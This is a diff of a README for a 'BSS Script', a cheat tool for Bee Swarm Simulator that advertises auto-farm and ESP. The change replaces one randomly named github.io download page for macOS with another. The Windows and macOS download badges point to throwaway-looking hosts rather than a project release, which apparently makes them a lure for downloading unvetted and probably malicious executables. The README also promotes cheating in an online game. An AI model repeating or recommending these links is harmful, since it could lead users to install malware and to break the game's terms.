@@ -51,7 +51,7 @@ The most reliable **BSS Script** for Bee Swarm Simulator — auto-farm, ESP, aim
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://jaifcflcufqn.github.io/mac-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ApexShrimpJetty10.github.io/macos-install/)
 
 </div>
 
